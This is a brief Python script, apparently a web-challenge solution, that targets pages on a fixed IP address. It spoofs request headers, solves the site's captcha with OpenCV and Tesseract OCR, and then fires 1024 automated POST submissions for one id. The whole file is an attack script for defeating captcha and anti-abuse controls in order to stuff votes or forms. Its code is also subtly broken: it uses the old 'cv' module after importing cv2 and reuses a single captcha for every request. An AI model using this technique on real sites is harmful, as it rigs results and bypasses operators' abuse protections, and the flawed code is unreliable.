#!/usr/bin/python3
import cv2
import tesseract
import requests
import tempfile

posturl = 'http://158.69.76.135/level2.php'
headers = {
    'Referer': 'http://158.69.76.135/level2.php',
    'User-Agent': 'Mozilla/4.01 [en] (Win95; I)'
}

captcha = 'http://158.69.76.135/captcha.php'
c = requests.get(captcha, headers=headers)
with tempfile.NamedTemporaryFile(delete=False) as temp:
    temp.write(c.raw.read())
    temp.seek(0)
    temp.close()
    gray = cv.LoadImage(temp.name, cv.CV_LOAD_IMAGE_GRAYSCALE)
    cv.Threshold(gray, gray, 231, 255, cv.CV_THRESH_BINARY)
    api = tesseract.TessBaseAPI()
    api.Init(".","eng",tesseract.OEM_DEFAULT)
    api.SetVariable("tessedit_char_whitelist", "0123456789abcdefghijklmnopqrstuvwxyz")
    api.SetPageSegMode(tesseract.PSM_SINGLE_WORD)
    tesseract.SetCvImage(gray,api)
    captcha = api.GetUTF8Text()

posturl = "http://158.69.76.135/level3.php"

headers = {
    'Referer': 'http://158.69.76.135/level3.php',
    'User-Agent': 'Mozilla/4.01 [en] (Win95; I)'
}


get = requests.get(posturl, headers=headers)

for i in range(1024):
    get = requests.post(
        posturl,
        data={'id': '923',
              'holdthedoor': 'Submit',
              'key': get.cookies['HoldTheDoor'],
              'captcha': captcha},
        cookies=get.cookies,
        headers=headers
    )
